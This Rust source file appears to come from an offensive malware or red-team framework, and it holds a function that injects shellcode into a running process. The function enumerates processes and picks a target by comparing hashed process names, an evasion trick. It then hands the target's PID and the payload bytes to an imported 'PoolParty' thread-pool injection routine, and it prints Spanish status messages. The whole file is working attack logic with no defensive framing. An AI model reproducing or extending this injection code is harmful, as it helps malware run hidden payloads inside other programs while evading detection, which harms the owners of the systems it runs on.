use crate::techniques::discovery::process::*;
use crate::techniques::evasion::api_hashing::*;
use crate::techniques::evasion::execution::execute_poolparty_shellcode::*;
use rand_core::{OsRng, RngCore};

pub fn poolparty_inyect_random_process(
    hashed_proccess_names: Vec<u32>,
    bytes_to_write: &[u8],
) -> Result<(), String> {
    let processes_info = match process_discovery() {
        Ok(info) => info,
        Err(e) => {
            return Err(e);
        }
    };

    let number_of_process = processes_info.len();
    if number_of_process == 0 {
        return Err("No se han encontrado procesos en el sistema.".to_string());
    }

    let start = (OsRng.next_u32() as usize) % number_of_process;

    let mut found = false;
    let mut pid_to_inject: u32 = 0;

    for i in 0..number_of_process {
        let idx = (start + i) % number_of_process;
        for &process_name_hashed in &hashed_proccess_names {
            if unique_hash(processes_info[idx].name.as_str()) == process_name_hashed {
                pid_to_inject = processes_info[idx].pid as u32;
                found = true;
                break;
            }
        }
        if found {
            break;
        }
    }
    if found == false {
        return Err(
            "No se ha encontrado un proceso coincidente con los nombres hasheados provistos."
                .to_string(),
        );
    }


    match execute_poolparty_shellcode(pid_to_inject, bytes_to_write) {
        Ok(_) => {
            #[cfg(debug_assertions)]
            println!(
                "[+] Poolparty ejecutado exitosamente en el proc: {}, con el shellcode len {}",
                pid_to_inject,
                bytes_to_write.len()
            );
            Ok(())
        }
        Err(e) => Err(format!("[!] Poolparty error: {}", e)),
    }
}
